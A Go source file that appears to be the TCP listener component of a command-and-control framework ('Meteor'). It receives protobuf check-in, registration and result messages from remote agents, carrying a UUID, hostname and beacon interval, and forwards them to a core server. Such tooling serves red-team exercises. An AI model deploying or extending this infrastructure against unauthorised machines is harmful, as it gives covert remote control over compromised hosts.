package main

import (
	"fmt"
	sUtils "github.com/degenerat3/meteor/meteor/listeners/utils"
	"github.com/degenerat3/meteor/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"net"
	"os"
)

// PORT is the port that Petrie comms will be recieved on
var PORT = os.Getenv("PETRIE_PORT")

// CORESERVER is the IP:Port of the Meteor core
var CORESERVER = os.Getenv("CORE_SERVER") // format: 9.9.9.9:9999

func main() {
	portStr := ":" + PORT
	l, err := net.Listen("tcp4", portStr)
	if err != nil {
		os.Exit(1)
	}

	defer l.Close()
	fmt.Println("Listening for Petri connections on port:" + PORT)
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		// Handle connections in a new goroutine.
		go connHandle(conn)
	}
}

func connHandle(conn net.Conn) {
	data := make([]byte, 4096)
	conn.Read(data)
	comms := &mcs.MCS{}
	err := proto.Unmarshal(data, comms)
	if err != nil {
		return
	}
	md := comms.GetMode()
	var retData []byte
	if md == "checkin" {
		retData = sUtils.HandleCheckin(comms.GetUuid(), CORESERVER)
	} else if md == "register" {
		retData = sUtils.HandleReg(comms.GetUuid(), comms.GetInterval(), comms.GetDelta(), comms.GetHostname(), CORESERVER)
	} else if md == "addResult" {
		retData = sUtils.HandleAddRes(comms.GetUuid(), comms.GetResult(), CORESERVER)
	} else {
		conn.Write([]byte(""))
	}
	conn.Write(retData)
	return
}
